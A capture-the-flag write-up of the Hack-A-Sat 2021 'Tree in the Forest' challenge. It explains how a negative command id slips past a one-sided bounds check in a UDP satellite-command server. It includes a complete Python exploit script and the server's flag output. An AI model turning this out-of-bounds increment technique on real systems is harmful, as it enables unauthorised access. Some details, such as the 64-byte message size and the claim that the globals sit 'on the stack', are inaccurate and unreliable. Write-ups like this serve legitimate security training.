---
title: "Hack-A-Sat 2021: Tree in the Forest"
summary: "Tree in the forest"
date: 2021-06-30
categories:
  - "writeups"
tags:
  - "exploitation"
---

**Category:** Exploitation  
**Points:** 31  
**Provided:** [parser.c](https://github.com/starfleetcadet75/writeups/blob/master/2021-Hack-A-Sat/tree-in-the-forest/parser.c?raw=true)

## Challenge

> ```none
> CC=g++-9.3.0
> 
> challenge: src/parser.c
>     $(CC) src/parser.c -o $@
> ```
>
> Connect to the challenge on:
> `lucky-tree.satellitesabove.me:5008`

## Observations

We are provided with a C source file and the contents of a Makefile for compiling it.
The program is a simple UDP server that listens for messages on port 54321.
It continously receives messages in an infinite processing loop.

```cpp
do{
    std::stringstream response;
    socklen_t len;
    int n;
    len = sizeof(cliaddr);

    n = recvfrom(sockfd, (char *)buffer, sizeof(command_header), MSG_WAITALL, (struct sockaddr *)&cliaddr, &len);

    if (n != sizeof(command_header)){ // this should never happen, due to UDP
      response << "Invalid length of command header, expected "<<sizeof(command_header)<<" but got "<<n<<std::endl;
    } else {
      command_header* header = (command_header*)buffer;
      response<<"Command header acknowledge: version:"<<header->version<<" type:"<<header->type<<" id:"<<header->id<<std::endl;

      if (header->id >= COMMAND_LIST_LENGTH){
        response<<"Invalid id:"<<header->id<<std::endl;
      } else {

        // Log the message in the command log
        command_log[header->id]++;

        // Handle the message, return the response
        response<<handle_message(header)<<std::endl;
      }
    }

    sendto(sockfd, response.str().c_str(), response.str().length(), MSG_CONFIRM, (const struct sockaddr *) &cliaddr, len);
} while(1);
```

Each message must be 64 bytes long so that it can be processed as a `command_header` struct.
The `version` and `type` fields are displayed on stdout but otherwise never used.

```cpp
typedef struct command_header {
    short version : 16;
    short type : 16;
    command_id_type id : 32;
} command_header;
```

`command_id_type` identifies the type of command based on an enumeration of 10 message types.
The last entry, `COMMAND_GETKEYS`, instructs the server to return the flag if the global variable `lock_state` is set to UNLOCKED.

```cpp
// Logs how many times each command has been hit.
// Has a simple security feature that hides data from the user.
typedef enum command_id_type {
    COMMAND_ADCS_ON = 0,
    COMMAND_ADCS_OFF = 1,
    COMMAND_CNDH_ON = 2,
    COMMAND_CNDH_OFF = 3,
    COMMAND_SPM = 4,
    COMMAND_EPM = 5,
    COMMAND_RCM = 6,
    COMMAND_DCM = 7,
    COMMAND_TTEST = 8,
    COMMAND_GETKEYS = 9, // only allowed in unlocked state
} command_id_type;
```

The processing loop records each valid command that is received by incrementing the `command_log` array indexed by `id`.
Note that `lock_state` happens to be declared directly before the `command_log` array.

```cpp
// Globals used in this program, used to store command log and locked/unlocked state
unsigned int lock_state;
char command_log[COMMAND_LIST_LENGTH];
```

## Solution

The vulnerability in this program is that the processing loop only validates that `id` is greater than or equal to 10.
This check permits negative `id` values to be used as an index into the `command_log` array.
Since the `lock_state` variable is located directly before the array on the stack, incrementing `command_log[-1]` causes `lock_state` to be incremented instead of a valid entry in the array.

```cpp
if (header->id >= COMMAND_LIST_LENGTH){
    response<<"Invalid id:"<<header->id<<std::endl;
} else {
    // Log the message in the command log
    command_log[header->id]++;

    // Handle the message, return the response
    response<<handle_message(header)<<std::endl;
}
```

We must set the value of `lock_state` to 0, however we can only increment the value.
Since the server runs in an infinite loop, we can just send 255 messages to cause `lock_state` to overflow back to a value of 0.
The actual `id` value we need to send is not -1 but -8 since the size of each array entry and `lock_state` are 64 bits.

```python
from pwn import *
import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.connect(("localhost", 54321))
    s.connect(("18.118.161.198", 10444))
    return s

def exploit(p):
    # Send the malicious message 255 times
    for i in range(255):
        msg = b""
        msg += p16(1)  # version = 1
        msg += p16(2)  # type = 2
        msg += p32(0xfffffff8)  # id = 0xfffffff8 = -8
        p.send(msg)
        print(p.recvfrom(1024))

    msg = b""
    msg += p16(2)  # version = 2
    msg += p16(4)  # type = 4
    msg += p32(9)  # id = COMMAND_GETKEYS
    p.send(msg)
    print(p.recvfrom(1024))

p = connect()
exploit(p)
```

The server outputs the flag after 255 iterations:

```none
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:1 type:2 id:-8\nCommand Success: UNLOCKED\n', ('18.118.161.198', 10444))
(b'Command header acknowledge: version:2 type:4 id:9\nflag{hotel771085mike2:GDNSSINe9Y1jIMMauT0hcP4AAtJ0lAdSGD2WGrozvH79QG0xDaF9YFJhrmzv_YAw5ggfPT8YRBOQ0smqzWgDV3s}\n', ('18.118.161.198', 10444))
```
